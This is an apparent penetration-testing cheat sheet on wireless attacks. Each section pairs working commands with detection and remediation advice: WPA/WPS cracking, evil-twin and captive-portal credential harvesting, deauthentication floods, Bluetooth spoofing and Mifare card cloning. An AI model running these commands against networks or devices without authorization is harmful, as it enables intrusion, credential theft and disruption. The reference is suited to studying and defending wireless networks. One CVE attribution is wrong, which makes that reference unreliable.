# Wireless Attacks Reference

## Overview
Wireless attacks target vulnerabilities in Wi-Fi networks, Bluetooth connections, and other wireless communication protocols.

**MITRE ATT&CK**: T1557 (Adversary-in-the-Middle), T1040 (Network Sniffing), T1200 (Hardware Additions)

---

## WPA/WPA2 Attacks

### Description
Attacking Wi-Fi Protected Access security protocols to gain unauthorized network access.

### Attack Types
- **WPA/WPA2 Handshake Capture**: Capturing 4-way handshake
- **PMKID Attack**: Attacking without clients
- **WPS PIN Attack**: Exploiting WPS vulnerability
- **Brute Force/Dictionary**: Cracking captured handshakes

### Tools
- aircrack-ng suite
- hashcat (GPU acceleration)
- wifite2 (automated)
- reaver (WPS attacks)
- hcxdumptool/hcxtools
- Wireshark

### Testing Methodology
1. Enable monitor mode on wireless adapter
2. Scan for target networks
3. Capture handshake or PMKID
4. Convert to hashcat format if needed
5. Perform dictionary/brute force attack
6. Test network access

### Example Commands
```bash
# Enable monitor mode
airmon-ng start wlan0
# Creates wlan0mon

# Scan for networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauthenticate client to capture handshake
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack with aircrack-ng
aircrack-ng -w wordlist.txt capture-01.cap

# PMKID attack (no clients needed)
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o pmkid.hash pmkid.pcapng

# Crack with hashcat
hashcat -m 22000 pmkid.hash wordlist.txt
hashcat -m 22000 pmkid.hash -a 3 ?d?d?d?d?d?d?d?d

# Automated with wifite2
wifite --kill
```

### WPS PIN Attack
```bash
# Scan for WPS-enabled networks
wash -i wlan0mon

# Reaver WPS attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# PixieWPS attack (faster)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K
```

### Detection Methods
- Monitor for deauthentication frames
- Detect WPS brute force attempts
- Intrusion Detection Systems
- Client disconnection alerts
- Wireless IDS (WIDS)

### Remediation
- Use WPA3 where possible
- Disable WPS completely
- Use strong, random passphrases (20+ characters)
- Implement 802.11w (Management Frame Protection)
- Regular password rotation
- MAC address filtering (defense in depth)
- Monitor wireless networks
- Use enterprise authentication (802.1X)

### References
- **MITRE ATT&CK**: T1557.002, T1040
- **CWE**: CWE-521 (Weak Password Requirements)
- **CVE Examples**: CVE-2017-13082 (KRACK)
- **Resources**: https://www.aircrack-ng.org/

---

## WPA3 Attacks

### Description
Attacking the latest Wi-Fi security standard WPA3.

### Known Vulnerabilities
- **Dragonblood**: Downgrade and side-channel attacks
- **Timing attacks**: Password length discovery
- **Downgrade to WPA2**: Transition mode exploitation

### Tools
- Dragonblood attack scripts
- hostapd-wpe (for testing)
- Custom timing attack scripts

### Testing Methodology
1. Identify WPA3 networks
2. Test for downgrade to WPA2
3. Attempt timing side-channel attacks
4. Test for known CVEs
5. Verify proper implementation

### Example Commands
```bash
# Scan for WPA3 networks
airodump-ng wlan0mon | grep WPA3

# Test for downgrade vulnerability
# Requires custom scripts from Dragonblood research

# Check for transition mode
airodump-ng wlan0mon
# Look for networks advertising both WPA2 and WPA3
```

### Detection Methods
- Monitor for downgrade attempts
- Implement proper WPA3 only mode
- Network anomaly detection
- Firmware update monitoring

### Remediation
- Disable WPA3 transition mode
- Use WPA3-only networks
- Apply latest firmware updates
- Implement 802.11w (mandatory in WPA3)
- Regular security updates
- Use strong SAE passwords

### References
- **CVE**: CVE-2019-13377, CVE-2019-13456 (Dragonblood)
- **Research**: https://wpa3.mathyvanhoef.com/
- **Wi-Fi Alliance**: WPA3 Security Considerations

---

## Evil Twin / Rogue Access Point

### Description
Creating a fake access point that mimics a legitimate network to intercept traffic or steal credentials.

### Attack Process
1. Clone legitimate AP (SSID, MAC)
2. Deauthenticate clients from real AP
3. Clients connect to evil twin
4. Capture credentials or perform MitM
5. Optionally forward traffic to maintain connectivity

### Tools
- airbase-ng
- hostapd
- wifiphisher (automated)
- mana toolkit
- fluxion (automated)
- bettercap

### Testing Methodology
1. Identify target network
2. Set up rogue AP with same SSID
3. Deauthenticate clients
4. Capture authentication attempts
5. Perform credential harvesting
6. Test captive portal attacks

### Example Commands
```bash
# Create rogue AP with airbase-ng
airbase-ng -e "TargetSSID" -c 6 wlan0mon

# hostapd configuration
cat > hostapd.conf << EOF
interface=wlan0mon
ssid=TargetSSID
channel=6
driver=nl80211
EOF
hostapd hostapd.conf

# Automated with wifiphisher
wifiphisher -aI wlan0 -e "TargetSSID"

# Bettercap
bettercap -iface wlan0
> wifi.recon on
> wifi.ap
```

### Captive Portal Attack
```bash
# wifiphisher with credential harvesting
wifiphisher -aI wlan0 -e "TargetNetwork" --force-hostapd

# Custom captive portal
# Set up web server with fake login page
python3 -m http.server 80

# Redirect all traffic to captive portal
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
```

### Detection Methods
- Monitor for duplicate SSIDs
- Detect MAC address conflicts
- Signal strength analysis
- WIDS/WIPS deployment
- Certificate validation (for WPA2-Enterprise)
- 802.11w (Management Frame Protection)

### Remediation
- Enable 802.11w (MFP)
- Use WPA2-Enterprise with certificate validation
- Educate users on fake AP risks
- Deploy WIDS/WIPS
- Use VPN on public networks
- Verify network certificates
- Disable auto-connect

### References
- **MITRE ATT&CK**: T1557 (Adversary-in-the-Middle)
- **CWE**: CWE-300 (Channel Accessible by Non-Endpoint)
- **CAPEC**: CAPEC-94 (Adversary in the Middle)

---

## Deauthentication Attacks

### Description
Sending deauthentication frames to disconnect clients from wireless networks.

### Purpose
- Force handshake capture
- Denial of service
- Force connection to evil twin
- Disruption

### Tools
- aireplay-ng
- mdk4
- mdk3
- wifite2
- bettercap

### Testing Methodology
1. Identify target network and clients
2. Send deauthentication frames
3. Monitor disconnections
4. Capture reconnection handshakes
5. Document impact

### Example Commands
```bash
# Deauth specific client
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Deauth all clients on AP
aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# mdk3 deauth
mdk3 wlan0mon d -c 6

# Continuous deauth with bettercap
bettercap -iface wlan0
> wifi.recon on
> wifi.deauth AA:BB:CC:DD:EE:FF
```

### Detection Methods
- Monitor for excessive deauth frames
- Implement 802.11w (MFP)
- WIDS alerts
- Client disconnection patterns
- Anomaly detection

### Remediation
- Enable 802.11w (Management Frame Protection)
- Use WPA3 (includes MFP by default)
- Deploy WIDS/WIPS
- Monitor for attack patterns
- Client education

### References
- **MITRE ATT&CK**: T1498 (Network Denial of Service)
- **CWE**: CWE-400 (Uncontrolled Resource Consumption)
- **IEEE**: 802.11w Amendment

---

## Bluetooth Attacks

### Description
Attacking Bluetooth-enabled devices for unauthorized access, data theft, or service disruption.

### Attack Types
- **Bluejacking**: Sending unsolicited messages
- **Bluesnarfing**: Unauthorized data access
- **Bluebugging**: Remote device control
- **KNOB Attack**: Encryption key reduction
- **MAC Spoofing**: Impersonating devices

### Tools
- BlueZ (Linux Bluetooth stack)
- hcitool (device discovery)
- sdptool (service discovery)
- btscanner
- spooftooph (MAC spoofing)
- blueranger (range finding)
- Ubertooth One (hardware)

### Testing Methodology
1. Enable Bluetooth adapter
2. Scan for devices in range
3. Enumerate services
4. Test for vulnerabilities
5. Attempt pairing/connection
6. Test for information disclosure
7. Attempt unauthorized access

### Example Commands
```bash
# Enable Bluetooth
hciconfig hci0 up

# Scan for devices
hcitool scan
btscanner

# Device information
hcitool info AA:BB:CC:DD:EE:FF

# Service discovery
sdptool browse AA:BB:CC:DD:EE:FF

# Get device name
hcitool name AA:BB:CC:DD:EE:FF

# Check if device is reachable
l2ping AA:BB:CC:DD:EE:FF

# MAC address spoofing
spooftooph -i hci0 -a AA:BB:CC:DD:EE:FF
```

### OBEX Push Attack
```bash
# Send file via OBEX push
obexftp -b AA:BB:CC:DD:EE:FF -p file.txt

# Using ussp-push
ussp-push AA:BB:CC:DD:EE:FF@9 file.txt file.txt
```

### Detection Methods
- Bluetooth monitoring
- Device pairing alerts
- Unauthorized connection detection
- Range-based security
- Bluetooth IDS

### Remediation
- Disable Bluetooth when not needed
- Use non-discoverable mode
- Require authentication and encryption
- Keep Bluetooth firmware updated
- Disable unnecessary services
- Monitor paired devices
- Use strong PIN codes
- Implement Bluetooth security policies

### References
- **MITRE ATT&CK**: T1011 (Exfiltration Over Other Network Medium)
- **CWE**: CWE-287 (Improper Authentication)
- **CVE Examples**: CVE-2019-9506 (KNOB), CVE-2020-0022 (BlueFrag)
- **NIST**: Bluetooth Security Guidelines

---

## RFID/NFC Attacks

### Description
Attacking Radio Frequency Identification and Near Field Communication systems.

### Attack Types
- **RFID Cloning**: Copying RFID tags
- **RFID Sniffing**: Intercepting communications
- **Relay Attacks**: Extending communication range
- **NFC Payment Interception**: Card skimming
- **Tag Emulation**: Impersonating tags

### Tools
- Proxmark3 (RFID/NFC research tool)
- Chameleon Mini (portable emulator)
- ACR122U (USB NFC reader)
- mfoc/mfcuk (Mifare cracking)
- libnfc tools

### Testing Methodology
1. Identify RFID/NFC systems
2. Determine card/tag type
3. Read tag data
4. Analyze encryption/authentication
5. Clone or emulate tag
6. Test access with cloned tag

### Example Commands
```bash
# Proxmark3 commands
pm3
> hf search  # Identify card type
> hf mf dump  # Dump Mifare card
> hf 14a reader  # Read ISO14443-A
> lf search  # Search for LF tags

# libnfc tools
nfc-list  # List NFC devices and tags
nfc-poll  # Poll for NFC tags
nfc-mfclassic r a dump.mfd  # Read Mifare Classic

# mfoc (Mifare Classic offline cracker)
mfoc -O dump.mfd

# mfcuk (Mifare Classic Universal toolKit)
mfcuk -C -R 0:A -v 2
```

### Common RFID/NFC Systems
- **Mifare Classic**: Legacy, vulnerable (CRYPTO1)
- **Mifare DESFire**: More secure, 3DES/AES
- **HID Prox**: Common access control
- **EM4x**: Simple 125kHz tags
- **ISO14443**: Contactless smart cards

### Detection Methods
- Monitor for unusual card presentations
- Detect relay attack timing
- Implement challenge-response authentication
- Use encrypted communications
- Physical security measures

### Remediation
- Use modern, secure card systems (Mifare DESFire EV2)
- Implement mutual authentication
- Use encrypted storage
- Regular key rotation
- Physical access controls
- Anti-cloning measures
- Monitor access patterns
- Replace legacy systems

### References
- **MITRE ATT&CK**: T1200 (Hardware Additions)
- **CWE**: CWE-294 (Authentication Bypass by Capture-replay)
- **CVE Examples**: CVE-2008-0166 (Mifare Classic)
- **Resources**: https://github.com/RfidResearchGroup/proxmark3

---

## Wireless Packet Sniffing

### Description
Capturing and analyzing wireless network traffic.

### What Can Be Captured
- Unencrypted traffic
- Network topology
- Device fingerprints
- DNS queries
- HTTP traffic (if not HTTPS)
- Metadata

### Tools
- Wireshark
- tcpdump
- airodump-ng
- tshark
- Kismet

### Testing Methodology
1. Enable monitor mode
2. Select capture channel(s)
3. Start packet capture
4. Apply filters for analysis
5. Extract relevant information
6. Analyze protocols and traffic patterns

### Example Commands
```bash
# Enable monitor mode
airmon-ng start wlan0

# Capture on specific channel
airodump-ng -c 6 wlan0mon -w capture

# Wireshark with monitor mode
wireshark -i wlan0mon

# tcpdump wireless capture
tcpdump -i wlan0mon -w capture.pcap

# tshark with filters
tshark -i wlan0mon -f "wlan type data"
tshark -r capture.pcap -Y "http.request"

# Kismet (comprehensive wireless monitoring)
kismet -c wlan0mon
```

### Analysis Filters
```bash
# Wireshark/tshark filters
wlan.fc.type_subtype == 0x08  # Beacon frames
wlan.fc.type_subtype == 0x00  # Association requests
http  # HTTP traffic
dns  # DNS queries
eapol  # Handshake frames
```

### Detection Methods
- Monitor for devices in promiscuous mode
- Use encrypted protocols (WPA2/WPA3)
- Implement VPN
- Network isolation
- WIDS/WIPS

### Remediation
- Use WPA2/WPA3 encryption
- Implement VPN for all traffic
- Use HTTPS for all web traffic
- Disable broadcasting SSID (minimal protection)
- Implement 802.1X authentication
- Network segmentation
- Regular security monitoring

### References
- **MITRE ATT&CK**: T1040 (Network Sniffing)
- **CWE**: CWE-319 (Cleartext Transmission)
- **Tools**: https://www.wireshark.org/

---

## Wireless Jamming

### Description
Disrupting wireless communications by overwhelming the frequency with noise.

### Jamming Types
- **Constant Jamming**: Continuous signal transmission
- **Deceptive Jamming**: Sending fake packets
- **Random Jamming**: Intermittent interference
- **Reactive Jamming**: Jamming upon detection

### Tools
- SDR (Software Defined Radio) devices
- mdk4/mdk3
- HackRF One
- USRP devices

**Note**: Wireless jamming is illegal in most jurisdictions without proper authorization.

### Testing Methodology
1. Identify target frequency
3. Configure jamming parameters
4. Execute jamming (in controlled environment)
5. Measure impact
6. Document findings

### Example Commands
```bash
# mdk4 beacon flooding (creates fake APs)
mdk4 wlan0mon b -f fake_aps.txt

# mdk4 authentication DoS
mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF

# mdk3 deauthentication
mdk3 wlan0mon d
```

### Detection Methods
- Spectrum analysis
- Signal strength monitoring
- Interference detection
- Wireless IDS
- Performance degradation alerts

### Remediation
- Use frequency hopping (where applicable)
- Implement redundant channels
- Deploy WIDS/WIPS
- Physical security (prevent physical access to jammers)
- Spectrum monitoring
- Legal enforcement

### References
- **MITRE ATT&CK**: T1498 (Network Denial of Service)
- **CWE**: CWE-400 (Uncontrolled Resource Consumption)
- **FCC**: Jamming Regulations
- **Legal**: Varies by jurisdiction - often illegal

---

## Wi-Fi Direct Attacks

### Description
Exploiting Wi-Fi Direct peer-to-peer connections.

### Vulnerabilities
- Weak PIN-based authentication
- No mutual authentication
- Information disclosure
- Man-in-the-middle opportunities

### Tools
- wpa_supplicant / wpa_cli
- wifi_direct_attack scripts
- Custom tools

### Testing Methodology
1. Enable Wi-Fi Direct
2. Scan for Wi-Fi Direct devices
3. Attempt connection
4. Test authentication weaknesses
5. Intercept communications
6. Test for information disclosure

### Example Commands
```bash
# Enable Wi-Fi Direct
wpa_cli p2p_find

# List discovered devices
wpa_cli p2p_peers

# Connect to device
wpa_cli p2p_connect <peer_address> <pbc|pin>

# Show group information
wpa_cli p2p_group_info
```

### Detection Methods
- Monitor Wi-Fi Direct connections
- Unexpected device pairing alerts
- Network monitoring
- Endpoint security

### Remediation
- Disable Wi-Fi Direct when not needed
- Use strong PINs
- Verify device identity before connecting
- Network isolation
- Regular security updates
- User education

### References
- **Wi-Fi Alliance**: Wi-Fi Direct Specification
- **CWE**: CWE-287 (Improper Authentication)
- **Security considerations**: Wi-Fi Direct security best practices
